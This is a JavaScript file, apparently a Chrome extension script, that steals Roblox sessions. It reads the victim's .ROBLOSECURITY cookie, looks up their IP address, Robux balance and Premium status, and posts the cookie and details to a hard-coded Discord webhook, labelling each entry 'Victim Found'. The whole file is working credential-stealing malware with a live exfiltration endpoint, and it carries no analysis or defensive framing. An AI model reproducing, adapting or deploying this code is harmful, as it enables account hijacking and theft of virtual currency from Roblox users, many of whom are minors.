const WEBHOOK = "https://discord.com/api/webhooks/1322567795820466326/3PF0HjpJ9VVuJNW7kXHnRXx_tJMBlWUp_nTQ1qKeEM3ipeYfc6fTdnmnC_pNC5c2rOgL";

let lastUsername = null;

async function sendWebhook(username, robuxBalance, isPremium, avatarUrl, cookie, ipAddr) {
    try {
        await fetch(WEBHOOK, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                content: null,
                embeds: [
                    {
                        description: "```" + (cookie || "COOKIE NOT FOUND") + "```",
                        color: 3447003,
                        fields: [
                            { name: "Username", value: username || "N/A", inline: true },
                            { name: "Robux", value: robuxBalance || "N/A", inline: true },
                            { name: "Premium", value: isPremium ? "Yes" : "No", inline: true },
                        ],
                        author: {
                            name: "Victim Found: " + ipAddr,
                            icon_url: avatarUrl,
                        },
                        footer: {
                            text: "https://github.com/ox-y",
                            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png",
                        },
                        thumbnail: { url: avatarUrl },
                    },
                ],
                username: "Roblox",
                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
            }),
        });
        console.log("Webhook sent successfully.");
    } catch (error) {
        console.error("Failed to send webhook:", error);
    }
}

async function fetchIpAddress() {
    try {
        const response = await fetch("https://api.ipify.org");
        if (!response.ok) throw new Error("Failed to fetch IP address");
        return await response.text();
    } catch (error) {
        console.error("Error fetching IP address:", error);
        return "Unknown IP";
    }
}

async function fetchRobloxData(cookie) {
    try {
        const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
            headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
            redirect: "manual",
        });
        if (!response.ok) throw new Error("Invalid cookie or failed to fetch Roblox data");
        return await response.json();
    } catch (error) {
        console.error("Error fetching Roblox data:", error);
        return null;
    }
}

async function main(cookie) {
    if (!cookie) {
        console.warn("No cookie found! Ensure you are logged in to Roblox.");
        return;
    }

    const ipAddr = await fetchIpAddress();
    const statistics = await fetchRobloxData(cookie);
    if (!statistics) return;

    const currentUsername = statistics?.UserName || "N/A";
    const robuxBalance = statistics?.RobuxBalance || "N/A";
    const isPremium = statistics?.IsPremium || false;
    const avatarUrl = statistics?.ThumbnailUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png";

    console.log(`Username: ${currentUsername}, Robux: ${robuxBalance}, Premium: ${isPremium}`);

    if (currentUsername !== lastUsername) {
        console.log(`New username detected: ${currentUsername}`);
        await sendWebhook(currentUsername, robuxBalance, isPremium, avatarUrl, cookie, ipAddr);
        lastUsername = currentUsername;
    } else {
        console.log(`No change in username. Current: ${currentUsername}`);
    }
}

// Ensure the Chrome extension permissions include "cookies" and the Roblox domain
chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, function (cookie) {
    main(cookie?.value || null);
});
